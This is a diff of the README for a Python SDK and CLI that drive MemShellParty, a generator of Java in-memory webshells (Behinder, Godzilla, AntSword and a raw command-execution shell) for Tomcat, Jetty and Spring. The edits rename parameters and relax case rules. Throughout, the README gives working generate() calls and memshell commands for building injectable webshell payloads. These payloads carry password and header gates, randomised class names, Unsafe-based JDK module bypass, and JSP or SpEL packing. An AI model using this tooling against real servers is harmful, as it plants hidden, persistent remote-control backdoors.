@@ -17,9 +17,9 @@ from wtfutil import MemShellParty, MemShellPartyError
 
 with MemShellParty() as client:
     result = client.generate(
-        shell_tool="Behinder",
-        shell_type="Listener",
-        target_jre_version=53,   # Java 9+; auto byPassJavaModule=True when unset
+        shell_tool="behinder",   # case-insensitive
+        shell_type="listener",
+        jre=9,                   # Java/JRE release; ≥9 auto byPassJavaModule=True
         password="pass",         # convenience password → behinderPass
         header_value="secret",   # header gate (default header_name=User-Agent)
     )
@@ -113,6 +113,8 @@ Invalid combos fail on the server; the SDK raises `MemShellPartyError`.
 
 `generate(**kwargs)` uses **snake_case**; the SDK builds official camelCase JSON. You may also pass a full `body=` dict. When both are present, **body deep-merges over** the kwargs-built payload.
 
+**Case**: `server` / `shell_tool` / `shell_type` are **case-insensitive** within the known official names (`tomcat` → `Tomcat`, `GODZILLA` → `Godzilla`). Unknown names are sent as-is. The known list may lag upstream; check with `get_config()` / `memshell config`.
+
 ### Built-in defaults (aligned with the official UI)
 
 | Dimension | Default |
@@ -120,13 +122,13 @@ Invalid combos fail on the server; the SDK raises `MemShellPartyError`.
 | `server` | `Tomcat` |
 | `shell_tool` | **`Behinder`** |
 | `shell_type` | `Listener` |
-| `target_jre_version` | `50` (Java 6) |
+| `jre` | `6` (Java 6; also common: 8 / 9 / 11 / 17 / 21) |
 | `server_version` | `"unknown"` (rarely needed) |
 | `shrink` | `True` |
 | `static_initialize` | `True` |
 | `packer` | `DefaultBase64` |
 | `header_name` | `User-Agent` |
-| `by_pass_java_module` | If omitted: `True` when JRE ≥ 53, else `False` |
+| `by_pass_java_module` | If omitted: `True` when `jre ≥ 9`, else `False` |
 
 For `shell_tool="Command"` when unset: `encryptor="RAW"`, `implementation_class="RuntimeExec"`.
 
@@ -136,7 +138,7 @@ For `shell_tool="Command"` when unset: `encryptor="RAW"`, `implementation_class=
 |------|----------|
 | `password="x"` | Mapped by `shell_tool` to Behinder / Godzilla / AntSword `*Pass` |
 | `key="k"` | Written as Godzilla `godzillaKey` (usually irrelevant for other tools) |
-| `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | **Specific fields win over** convenience `password` / `key` |
+| `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | Advanced: specific fields win over `password` / `key` (prefer convenience fields day-to-day) |
 | Empty password fields | Server generates random values; returned in `memShellResult.shellToolConfig` |
 | `header_name` + `header_value` | Request must match this header before shell logic runs; set `header_value` yourself in practice |
 
@@ -161,11 +163,12 @@ client.generate(shell_tool="Behinder", password="ignored", behinder_pass="real")
 
 | kwargs | Official field | Meaning |
 |--------|----------------|---------|
-| `server` | shellConfig.server | Target middleware/framework (Tomcat, Jetty, SpringWebMvc…) |
+| `server` | shellConfig.server | Target middleware (case-insensitive): Tomcat, Jetty, SpringWebMvc… |
 | `server_version` | shellConfig.serverVersion | Server version; only needed for a few mount types |
-| `shell_tool` | shellConfig.shellTool | Behinder / Godzilla / Command / AntSword… |
-| `shell_type` | shellConfig.shellType | Listener / Filter / Valve / Servlet / Agent… |
-| `target_jre_version` | shellConfig.targetJreVersion | class major version; see table below |
+| `shell_tool` | shellConfig.shellTool | Behinder / Godzilla / Command… (case-insensitive) |
+| `shell_type` | shellConfig.shellType | Listener / Filter / Valve… (case-insensitive) |
+| `jre` | shellConfig.targetJreVersion | **Preferred**: Java/JRE release `6` / `8` / `9` / `11` / `17` / `21` |
+| `target_jre_version` | same | Advanced/legacy; release or official class major; `jre` wins if both set. A `targetJreVersion` inside `body` is sent as-is (no release conversion) |
 | `debug` | shellConfig.debug | Injector prints inject info; shell prints stack traces |
 | `by_pass_java_module` | shellConfig.byPassJavaModule | Bypass JDK9+ modules via Unsafe defineClass |
 | `shrink` | shellConfig.shrink | Shrink bytecode (ASM SKIP_DEBUG); default True |
@@ -175,10 +178,10 @@ client.generate(shell_tool="Behinder", password="ignored", behinder_pass="real")
 | `injector_class_name` | injectorConfig.injectorClassName | Injector FQCN; empty = random |
 | `static_initialize` | injectorConfig.staticInitialize | Static block calls ctor (`Class.forName(..., true, ...)`) |
 | `shell_class_name` | shellToolConfig.shellClassName | Shell FQCN; empty = random |
-| `behinder_pass` | behinderPass | Behinder password |
-| `godzilla_pass` / `godzilla_key` | godzillaPass / godzillaKey | Godzilla pass/key |
-| `ant_sword_pass` | antSwordPass | AntSword password |
-| `password` / `key` | (mapped by tool) | Convenience credentials; see above |
+| `behinder_pass` | behinderPass | Advanced Behinder password (prefer `password`) |
+| `godzilla_pass` / `godzilla_key` | godzillaPass / godzillaKey | Advanced Godzilla pass/key (prefer `password` / `key`) |
+| `ant_sword_pass` | antSwordPass | Advanced AntSword password (prefer `password`) |
+| `password` / `key` | (mapped by tool) | **Preferred** convenience credentials |
 | `header_name` / `header_value` | headerName / headerValue | Entry header gate |
 | `command_param_name` | commandParamName | Command: param or header name |
 | `command_template` | commandTemplate | Command: template with `{command}` |
@@ -187,18 +190,7 @@ client.generate(shell_tool="Behinder", password="ignored", behinder_pass="real")
 | `shell_class_base64` | shellClassBase64 | Custom: Base64 of a `.class` |
 | `packer` | packer | Packing format (DefaultBase64, JSP, SpEL…) |
 
-### JRE class version
-
-| Java | `target_jre_version` |
-|------|----------------------|
-| 6 | 50 |
-| 8 | 52 |
-| 9 | 53 |
-| 11 | 55 |
-| 17 | 61 |
-| 21 | 65 |
-
-For JDK 9+ runtimes, prefer at least `53` so module bypass turns on automatically.
+For JDK 9+ runtimes, pass `jre=9` (or higher) so module bypass turns on automatically.
 
 ---
 
@@ -243,7 +235,7 @@ with MemShellParty() as client:
         server="Tomcat",
         shell_tool="Behinder",
         shell_type="Filter",
-        target_jre_version=52,
+        jre=8,
         url_pattern="/*",
         password="admin",
         header_name="User-Agent",
@@ -261,7 +253,7 @@ with MemShellParty() as client:
     r = client.generate(
         shell_tool="Command",
         shell_type="Listener",
-        target_jre_version=53,
+        jre=9,
         command_param_name="cmd",
         encryptor="RAW",
         implementation_class="RuntimeExec",
@@ -279,7 +271,7 @@ body = {
     "packer": "DefaultBase64",
 }
 # kwargs defaults are built first; body deep-merges on top
-result = client.generate(body=body, target_jre_version=53)
+result = client.generate(body=body, jre=9)
 ```
 
 Build the request without sending:
@@ -322,8 +314,12 @@ Typical causes: illegal combo, unreachable host, non-JSON response, timeout. Tra
 | Symbol | Notes |
 |--------|--------|
 | `DEFAULT_BASE_URL` | Default service root constant |
+| `JRE_RELEASE_TO_CLASS` | JRE release → class major map (rarely needed directly) |
+| `KNOWN_SERVERS` / `KNOWN_SHELL_TOOLS` / `KNOWN_SHELL_TYPES` | Known names for case folding |
+| `canonicalize_server` / `canonicalize_shell_tool` / `canonicalize_shell_type` | Standalone normalizers |
 | `memshell_config` | Runtime config dict (`BASE_URL`) |
 | `build_generate_body(...)` | Build request body only (no HTTP) |
+| `resolve_jre_class_version(...)` | Normalize release or class major to API number |
 | `resolve_shell_credentials(...)` | Map `password`/`key` to tool-specific fields |
 | `extract_generate_meta(result, output=...)` | Compact meta from a generate response |
 | `MemShellPartyError` | API / protocol errors |
@@ -337,7 +333,7 @@ The `memshell` console script ships with the package (not in `__all__`). Prefer 
 ```bash
 memshell generate --help
 memshell generate -o payload.txt
-memshell generate --shell-tool Godzilla --shell-type Filter --target-jre-version 53 -o out.txt
+memshell generate --shell-tool Godzilla --shell-type Filter --jre 9 -o out.txt
 memshell config
 memshell packers
 memshell install-skill --project
@@ -345,6 +341,9 @@ memshell install-skill --project
 
 - **`-o PATH`**: write only `packResult` to the file; stdout is meta JSON.
 - **Without `-o`**: stdout is the full response JSON.
+- **`--jre`**: target Java release (6/8/9/11/17/21).
+- **`--server` / `--shell-tool` / `--shell-type`**: case-insensitive for known names.
+- Prefer `--password` / `--key`; dedicated `*-pass` and `--target-jre-version` still work but are hidden from `--help`.
 
 Flags mirror the kwargs table above; see `memshell generate --help`.
 
